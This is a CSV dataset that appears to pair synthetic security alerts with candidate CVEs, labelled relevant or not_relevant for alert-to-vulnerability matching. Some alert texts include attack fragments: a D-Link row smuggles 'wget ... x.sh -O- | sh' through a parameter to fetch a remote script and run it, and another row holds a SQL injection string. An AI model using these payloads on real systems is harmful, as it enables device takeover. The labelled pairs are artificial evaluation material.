pair_id,alert_id,alert_text,candidate_cve_id,candidate_cve_description,suggested_label,suggested_reason,review_flag,human_label
BAIT-049__CVE-2023-41763,BAIT-049,Endpoint/network sensor captured Skype for Business (Microsoft) traffic consistent with an unspecified vulnerability that allows for privilege escalation. internal metadata endpoint reached via proxied request,CVE-2023-41763,Skype for Business Elevation of Privilege Vulnerability,relevant,Same product (Skype for Business) and same vuln type (privilege escalation),,relevant
BAIT-073__CVE-2023-20887,BAIT-073,"Anomalous Aria Operations for Networks activity detected, consistent with a command injection vulnerability that allows a malicious actor with network access to perform an attack resulting in remote code execution. input=`id` piped to internal exec() call",CVE-2023-20887,Aria Operations for Networks contains a command injection vulnerability. A malicious actor with network access to VMware Aria Operations for Networks may be able to perform a command injection attack resulting in remote code execution.,relevant,"Same product (Aria Operations for Networks), near-identical wording",,relevant
BAIT-003__CVE-2014-0160,BAIT-003,"OpenSSL heartbeat extension observed returning excess memory content beyond the requested payload length, consistent with a well-known 2014 buffer over-read vulnerability in TLS heartbeat handling. heartbeat request length mismatch: requested 65535, payload actual 18",CVE-2014-0160,"The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.",relevant,This is the actual Heartbleed CVE; matches exactly,,relevant
BAIT-075__CVE-2024-3400,BAIT-075,PAN-OS (Palo Alto Networks) telemetry shows a command injection vulnerability that allows an unauthenticated attacker to execute commands with root privileges on the firewall. malformed length field accepted without bounds check,CVE-2024-3400,"A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.

Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.",relevant,"Same product (PAN-OS/GlobalProtect), same mechanism (command injection, root)",,relevant
BAIT-065__CVE-2019-20500,BAIT-065,"DWL-2600AP Access Point (D-Link) telemetry shows an authenticated command injection vulnerability via the Save Configuration functionality in the Web interface, using shell metacharacters in the admin.cgi?action=config_save configBackup or downloadServerip parameter. cmd=;wget http://198.51.100.9/x.sh -O- | sh",CVE-2019-20500,"D-Link DWL-2600AP 4.2.0.15 Rev A devices have an authenticated OS command injection vulnerability via the Save Configuration functionality in the Web interface, using shell metacharacters in the admin.cgi?action=config_save configBackup or downloadServerip parameter.",relevant,"Same product (D-Link DWL-2600AP), same mechanism (Save Configuration command injection)",,relevant
BAIT-073__CVE-2023-4966,BAIT-073,"Anomalous Aria Operations for Networks activity detected, consistent with a command injection vulnerability that allows a malicious actor with network access to perform an attack resulting in remote code execution. input=`id` piped to internal exec() call",CVE-2023-4966,"Sensitive information disclosure in NetScaler ADC and NetScaler Gateway when configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or AAA  virtual server.",not_relevant,Alert is Aria Operations command injection; CVE is unrelated NetScaler info disclosure,,not_relevant
BAIT-069__CVE-2022-2856,BAIT-069,Endpoint/network sensor captured Chromium Intents (Google) traffic consistent with an insufficient validation of untrusted input vulnerability that allows a remote attacker to browse to a malicious website via a crafted HTML page.. malformed length field accepted without bounds check,CVE-2022-2856,Insufficient validation of untrusted input in Intents in Google Chrome on Android prior to 104.0.5112.101 allowed a remote attacker to arbitrarily browse to a malicious website via a crafted HTML page.,relevant,"Same product (Chromium Intents), near-identical wording",,relevant
BAIT-047__CVE-2024-6670,BAIT-047,Google Chromium V8 instance exhibiting an integer overflow vulnerability that allows a remote attacker to potentially exploit heap corruption via a crafted HTML page.. anomalous request pattern matching published exploit signature,CVE-2024-6670,"In WhatsUp Gold versions released before 2024.0.0, a SQL Injection vulnerability allows an unauthenticated attacker to retrieve the users encrypted password.",not_relevant,Alert is Chromium V8 heap corruption; CVE is unrelated WhatsUp Gold SQL injection,,not_relevant
BAIT-029__CVE-2023-40044,BAIT-029,Endpoint/network sensor captured WS_FTP Server (Progress) traffic consistent with a deserialization of untrusted data vulnerability in the Ad Hoc Transfer module that allows an authenticated attacker to execute remote commands on the underlying operating system. serialized object stream with unexpected class reference detected,CVE-2023-40044,"In WS_FTP Server versions prior to 8.7.4 and 8.8.2, a pre-authenticated attacker could leverage a .NET deserialization vulnerability in the Ad Hoc Transfer module to execute remote commands on the underlying WS_FTP Server operating system.",relevant,"Same product (WS_FTP Server), same mechanism (Ad Hoc Transfer deserialization)",,relevant
BAIT-051__CVE-2023-33009,BAIT-051,Security monitoring on a Microsoft Configuration Manager deployment flagged an SQL injection vulnerability. An unauthenticated attacker could exploit. ' OR 1=1-- payload in query parameter,CVE-2023-33009,"A buffer overflow vulnerability in the notification function in Zyxel ATP series firmware versions 4.60 through 5.36 Patch 1, USG FLEX series firmware versions 4.60 through 5.36 Patch 1, USG FLEX 50(W) firmware versions 4.60 through 5.36 Patch 1, USG20(W)-VPN firmware versions 4.60 through 5.36 Patch 1, VPN series firmware versions 4.60 through 5.36 Patch 1, ZyWALL/USG series firmware versions 4.60 through 4.73 Patch 1, could allow an unauthenticated attacker to cause denial-of-service (DoS) conditions and even a remote code execution on an affected device.",not_relevant,Alert is MS Configuration Manager SQLi; CVE is unrelated Zyxel firmware buffer overflow,,not_relevant
